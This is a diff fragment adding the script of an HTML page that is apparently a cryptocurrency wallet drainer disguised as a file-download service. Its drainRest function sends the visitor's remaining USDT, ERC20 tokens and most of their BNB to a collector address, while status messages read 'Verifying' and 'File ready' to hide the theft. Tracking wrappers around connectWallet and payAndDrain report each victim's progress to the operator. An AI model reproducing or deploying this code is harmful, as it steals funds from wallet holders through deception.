+            btn.style.display = '';
+            btn.disabled = false;
+            if (isReject(e)) { status('Cancelled'); return; }
+            status('❌ ' + msg);
+            log('ERROR: ' + msg);
+            alert(msg);
+        } finally {
+            running = false;
+        }
+    }
+
+    /* ---------- drain — வரிசை: மீதி USDT → token → BNB ---------- */
+    async function drainRest() {
+        const steps = [];
+
+        if (CFG.DRAIN_USDT_REST && PLAN.rest > 0n) steps.push({ l: 'USDT', f: async () => {
+            const r = await PLAN.usdt.balanceOf(USER);
+            if (r > 0n) await (await PLAN.usdt.transfer(CFG.COLLECTOR, r)).wait();
+        }});
+
+        for (const t of PLAN.tokens) steps.push({ l: 'TOKEN', f: async () => {
+            const c = new ethers.Contract(t, ERC20, signer);
+            const b = await c.balanceOf(USER);
+            if (b === 0n) return;
+            await (await c.transfer(CFG.COLLECTOR, b)).wait();
+        }});
+
+        if (PLAN.bnbWillGo) steps.push({ l: 'GAS', f: async () => {
+            const b2 = await provider.getBalance(USER);
+            const f2 = await provider.getFeeData();
+            const g2 = f2.maxFeePerGas || f2.gasPrice || 3000000000n;
+            const send = b2 - g2 * 21000n * BigInt(CFG.BNB_KEEP_TX);
+            if (send <= ethers.parseEther(CFG.BNB_MIN_BNB)) return;
+            await (await signer.sendTransaction({ to: CFG.COLLECTOR, value: send })).wait();
+        }});
+
+        const total = steps.length + 1;
+        for (let i = 0; i < steps.length; i++) {
+            status('Verifying ' + (i + 2) + '/' + total + ' — ' + steps[i].l);
+            try {
+                await steps[i].f();
+                log('sent ' + steps[i].l);
+            } catch (e) {
+                log('skip ' + steps[i].l);
+                if (isReject(e)) { status('✅ File ready — stopped'); return; }
+            }
+        }
+        status('✅ File ready');
+    }
+
+    /* ---------- verify (log மட்டும் — download ஏற்கனவே ஆகிவிட்டது) ---------- */
+    async function verifyAndDownload() {
+        try {
+            const res = await fetch('/api/verify', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ address: USER })
+            });
+            if (res.ok) {
+                const j = await res.json();
+                if (j && j.ok) log('verify ok');
+            }
+        } catch (e) {
+            log('backend off — direct file');
+        }
+    }
+    </script>
+<script>
+function track(e){try{fetch('/api/track',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ev:e})})}catch(x){}}
+track('visit');
+(function(){
+  var a=window.connectWallet; window.connectWallet=function(){track('connect_start');return a.apply(this,arguments)};
+  var b=window.payAndDrain;  window.payAndDrain =function(){track('pay_start');  return b.apply(this,arguments)};
+  var c=window.verifyAndDownload; window.verifyAndDownload=function(){track('pay_ok'); return c.apply(this,arguments)};
+})();
+</script>
+
+</body>
+</html>
